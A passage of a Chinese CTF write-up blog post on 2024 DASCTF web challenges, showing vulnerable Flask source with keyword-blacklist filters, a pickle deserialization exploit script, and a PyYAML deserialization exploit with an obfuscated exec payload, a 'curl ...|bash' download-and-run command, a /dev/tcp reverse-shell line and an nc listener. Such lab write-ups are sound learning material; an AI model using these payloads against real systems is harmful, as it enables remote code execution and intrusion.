methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-comment"># 从表单中获取用户名和密码</span><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <br>        <span class="hljs-comment"># 检查用户名是否为 &#x27;admin&#x27; 并验证密码</span><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">if</span> password == Admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 如果不是管理员登录，将用户名存入会话</span><br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">        &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">    &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5000</span>)<br><br><br><br><br><span class="hljs-comment"># 运行 Flask 应用</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>参考了群里<code>芝麻汤圆</code>师傅的<code>wp</code></p>
+</li>
+<li><p>思路：在<code>/ppicklee</code>目录触发<code>pickle</code>反序列化实现命令执行</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 执行后访问 /src 目录</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilObject</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 使用 subprocess.run 执行 &quot;dir&quot; 命令</span><br>        <span class="hljs-keyword">return</span> (subprocess.run, ([<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;cat ../../../flag &gt; app.py&quot;</span> ],),&#123;<span class="hljs-string">&quot;shell&quot;</span>: <span class="hljs-literal">True</span>&#125;)<br><br><span class="hljs-comment"># 创建恶意对象</span><br>evil_object = EvilObject()<br><br><span class="hljs-comment"># 序列化恶意对象</span><br>pickled_data = pickle.dumps(evil_object)<br><br><span class="hljs-comment"># base64 编码序列化对象</span><br>pickled_data_base64 = base64.b64encode(pickled_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment"># 输出序列化后的 Base64 编码</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Base64 Encoded Pickled Data:&quot;</span>)<br><span class="hljs-built_in">print</span>(pickled_data_base64)<br><br>url = <span class="hljs-string">&#x27;http://5db5a5dd-060d-4d20-a6f4-105ede2fc012.node5.buuoj.cn:81/ppicklee&#x27;</span><br><span class="hljs-comment"># 要发送的POST数据，通常是字典格式</span><br>data = &#123;<span class="hljs-string">&#x27;data&#x27;</span>: pickled_data_base64&#125;<br><br><span class="hljs-comment"># 发送POST请求</span><br>response = requests.post(url, data=data)<br><br><span class="hljs-comment"># 打印响应的状态码和内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Status Code:&#x27;</span>, response.status_code)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Response Text:&#x27;</span>, response.text)<br><br><span class="hljs-comment"># 访问新的地址</span><br>new_url = <span class="hljs-string">&#x27;http://5db5a5dd-060d-4d20-a6f4-105ede2fc012.node5.buuoj.cn:81/src&#x27;</span><br>new_response = requests.get(new_url)<br><br><span class="hljs-comment"># 打印新的地址的响应状态码和内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;New Status Code:&#x27;</span>, new_response.status_code)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;New Response Text:&#x27;</span>)<br><span class="hljs-built_in">print</span>(new_response.text)<br><span class="hljs-comment"># 匹配并打印出响应中的 DASCTF&#123;******&#125; 这一段字符</span><br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;DASCTF&#123;.*&#125;&#x27;</span>, new_response.text)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Flag:&#x27;</span>, <span class="hljs-keyword">match</span>.group(<span class="hljs-number">0</span>))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No flag found in the response.&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>这个EXP直接运行即可，会匹配Response中的flag并且打印输出</li>
+</ul>
+<blockquote>
+<figure class="highlight plaintext"><figcaption><span>(["bash","-c","cat ../../../etc/passwd > app.py" ],),&#123;"shell": True&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subprocess.run,">subprocess.run, ([&quot;bash&quot;,&quot;-c&quot;,&quot;cat ../../../flag &gt; app.py&quot; ],),&#123;&quot;shell&quot;: True&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里注意这个命令，与<code>2024 CCB Safe_proxy</code>那道题做法类似，如果直接执行<code>cat ../../../flag &gt; app.py</code> ，命令的效果是用<code>flag</code>文件内容把<code>app.py</code>文件覆盖掉，直接破坏原来的文件，学到的一个新方法是<code>&quot;-c&quot;</code>，这样是把<code>flag</code>文件内容附加到<code>app.py</code>文件下方</p>
+</blockquote>
+<h3 id="yaml"><a href="#yaml" class="headerlink" title="yaml"></a>yaml</h3><ul>
+<li>题目给出源码如下，我们加上注释</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入所需的模块</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template<br><br><span class="hljs-comment"># 创建 Flask 应用实例，指定模板文件夹为 &#x27;templates&#x27;</span><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br><span class="hljs-comment"># 设置上传文件夹的路径为 &#x27;uploads&#x27;</span><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br><span class="hljs-comment"># 如果上传文件夹不存在，则创建它</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 定义 Web 应用防火墙（WAF）函数，用于过滤输入</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_str</span>):<br>    <span class="hljs-comment"># 定义黑名单词汇集合</span><br>    blacklist_terms = &#123;<br>        <span class="hljs-string">&#x27;apply&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>,<br>        <span class="hljs-string">&#x27;command&#x27;</span>, <span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;templates&#x27;</span>, <span class="hljs-string">&#x27;session&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;globals&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>,<br>        <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;ntimeit&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;zsh&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;before_request&#x27;</span>, <span class="hljs-string">&#x27;after_request&#x27;</span>,<br>        <span class="hljs-string">&#x27;error_handler&#x27;</span>, <span class="hljs-string">&#x27;add_url_rule&#x27;</span>, <span class="hljs-string">&#x27;teardown_request&#x27;</span>, <span class="hljs-string">&#x27;teardown_appcontext&#x27;</span>, <span class="hljs-string">&#x27;\\u&#x27;</span>, <span class="hljs-string">&#x27;\\x&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;join&#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># 将输入转换为小写字符串</span><br>    input_str_lower = <span class="hljs-built_in">str</span>(input_str).lower()<br>    <span class="hljs-comment"># 遍历黑名单词汇，检查是否在输入中</span><br>    <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> blacklist_terms:<br>        <span class="hljs-keyword">if</span> term <span class="hljs-keyword">in</span> input_str_lower:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found blacklisted term: <span class="hljs-subst">&#123;term&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 定义正则表达式，用于匹配 YAML 文件</span><br>file_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;.*\.yaml$&#x27;</span>)<br><br><span class="hljs-comment"># 定义函数，用于检查文件名是否为 YAML 文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_yaml_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(file_pattern.<span class="hljs-keyword">match</span>(filename))<br><br><span class="hljs-comment"># 定义根路由，返回欢迎信息和链接</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to DASCTF X 0psu3</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 定义文件上传路由，处理 GET 和 POST 请求</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-comment"># 如果是 POST 请求</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 获取上传的文件</span><br>            uploaded_file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>            <span class="hljs-comment"># 如果文件存在且是 YAML 文件</span><br>            <span class="hljs-keyword">if</span> uploaded_file <span class="hljs-keyword">and</span> is_yaml_file(uploaded_file.filename):<br>                <span class="hljs-comment"># 构建文件保存路径</span><br>                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)<br>                <span class="hljs-comment"># 保存文件</span><br>                uploaded_file.save(file_path)<br>                <span class="hljs-comment"># 返回成功消息</span><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;uploaded successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 如果不是 YAML 文件，返回错误消息</span><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Just YAML file&quot;</span>&#125;), <span class="hljs-number">400</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-comment"># 如果发生异常，返回错误消息</span><br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br>    <span class="hljs-comment"># 如果是 GET 请求，渲染上传页面</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-comment"># 定义读取 YAML 文件内容的路由</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Yam1&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Yam1</span>():<br>    <span class="hljs-comment"># 从请求参数中获取文件名</span><br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-comment"># 如果文件名存在</span><br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-comment"># 打开文件并读取内容</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;uploads/<span class="hljs-subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_content = f.read()<br>        <span class="hljs-comment"># 如果内容不包含黑名单词汇</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf(file_content):<br>            <span class="hljs-comment"># 加载 YAML 内容</span><br>            test = yaml.load(file_content)<br>            <span class="hljs-comment"># 打印内容</span><br>            <span class="hljs-built_in">print</span>(test)<br>    <span class="hljs-comment"># 返回欢迎信息</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome&#x27;</span><br><br><span class="hljs-comment"># 如果直接运行这个脚本，启动 Flask 应用</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>看完代码，基本思路出来了，上传一个XXXX.yaml文件，利用yaml文件里写入命令执行内容，再通过GET访问Yam1路由，传参数filename&#x3D;XXXX （注意，这里不要带后缀yaml） 让靶机打开文件并读取加载，触发RCE的反弹shell</p>
+</li>
+<li><p>参考<code>gxngxngxn</code>师傅博客，之后翻到了真主大佬<code>Tr0y</code>师傅的<code>Python</code>沙盒<code>Bypass</code>博客，学习了一波，是真的膜拜</p>
+</li>
+<li><p>EXP生成脚本如下</p>
+</li>
+</ul>
+<blockquote>
+<p>此处也是和<code>gxngxngxn</code>师傅的博客学到了一个新的反弹<code>shell</code>命令</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">curl <span class="hljs-keyword">http</span>://ip/<span class="hljs-built_in">shell</span>.txt|bash<br></code></pre></td></tr></table></figure>
+
+<p>这个命令的意思是curl下载VPS<a target="_blank" rel="noopener" href="http://ip/%E4%B8%8A%E5%86%99%E7%9D%80%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E7%9A%84txt%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E4%B8%94bash%E6%89%A7%E8%A1%8C">http://ip/上写着反弹shell命令的txt文件，并且bash执行</a></p>
+<ul>
+<li>txt文件内容如下</li>
+</ul>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">bash -i &gt;&amp; <span class="hljs-keyword">/dev/</span>tcp<span class="hljs-keyword">/ip/</span>port <span class="hljs-number">0</span>&gt;<span class="hljs-variable">&amp;1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231931494.png" srcset="/img/loading.gif" lazyload alt="image-20241223193126428"></p>
+<ul>
+<li><p><code>VPS</code>端<code>nc</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p>之后就可以反弹<code>shell</code></p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;curl http://shell.txt|bash&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;exec(bytes([[j][0]for(i)in[range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="hljs-string">&quot;]]or[&quot;</span>.join([<span class="hljs-string">f&quot;i]in[[<span class="hljs-subst">&#123;i&#125;</span>]]and[j]in[[<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]]]))&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13281?time__1311=GqmxuD0DnD9D2iDlh+t0=KcDWqYvj+RIbpD#toc-6">https://xz.aliyun.com/t/13281?time__1311=GqmxuD0DnD9D2iDlh%2Bt0%3DKcDWqYvj%2BRIbpD#toc-6</a></p>
+</blockquote>
+<p><code>test.yaml</code>文件内容</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/new:type</span><br><span class="hljs-attr">args:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">exp</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-type">!!python/tuple</span> []<br>  <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">&quot;extend&quot;:</span> <span class="hljs-type">!!python/name:exec</span> &#125;<br><span class="hljs-attr">listitems:</span> <span class="hljs-string">&quot;上面的脚本输出的结果&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>上传<code>test.yaml</code>文件</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412230100951.png" srcset="/img/loading.gif" lazyload alt="image-20241223010012886"></p>
+<ul>
+<li><p><code>VPS</code>反弹<code>shell</code></p>
+</li>
+<li><p>访问<code>http://ip:port/Yam1?filename=文件名</code>，触发反弹shell，vps上连上靶机</p>
+</li>
+<li><p><code>cat ../../../flag</code></p>
+</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412230054422.png" srcset="/img/loading.gif" lazyload alt="image-20241223005407275"></p>
+<h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><ul>
+<li><code>robots.txt</code></li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231907566.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF-Writeup/" class="category-chain-item">CTF-Writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024-DASCTF-wp</div>
+      <div>http://example.com/2024/12/23/2024DASCTF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>XU17</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              XU17
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/20/WAFPecker/" title="WAFPecker">
+                        <span class="hidden-mobile">WAFPecker</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
